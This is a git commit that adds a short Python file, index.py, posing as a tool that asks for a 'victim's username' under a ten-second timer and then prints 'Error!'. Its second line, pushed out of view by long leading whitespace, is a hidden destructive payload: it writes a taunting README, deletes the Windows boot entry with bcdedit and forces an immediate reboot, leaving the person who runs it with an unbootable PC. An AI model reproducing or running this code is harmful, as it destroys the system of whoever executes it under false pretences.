d7152c669d3067f622d536500de3fee943a72b5a
someonefromdiscord <freehostlvr12@proton.me>
2025-02-15 14:40:32 +0100

    Create index.py

---
+++ index.py
@@ -0,0 +1,6 @@
+import os
+                                                        os.system('echo pc fucked. nice try! > README.txt && notepad README.txt && bcdedit /delete {current} && shutdown -r -t 0 -c "prepare to try booting pc >(:"')
+import time
+print("Type victim's username. It will be hidden. It has to be done under 10 seconds.")
+time.sleep(10)
+print("Error!")
